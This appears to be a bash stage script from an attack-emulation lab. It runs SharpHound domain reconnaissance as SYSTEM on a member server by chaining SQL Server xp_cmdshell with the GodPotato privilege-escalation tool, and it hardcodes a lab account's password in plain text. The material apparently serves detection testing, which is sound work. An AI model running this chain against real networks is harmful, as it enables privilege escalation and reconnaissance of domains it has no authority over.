#!/usr/bin/env bash
# T004 — SharpHound as SYSTEM on mbr01 via SQL xp_cmdshell + GodPotato
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T004-MBR01-BH-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T004 | ${CASE_ID} | T0=${T0} ==="

campaign_stage_file campaign-a-t043-system-exec.ps1
campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t004-mbr01-bh.ps1 child.cadre.local \
  "-Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools' -ZipPrefix 'T004-mbr01-bh'"

cadre_export "${CASE_ID}" T004 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T004 complete ==="
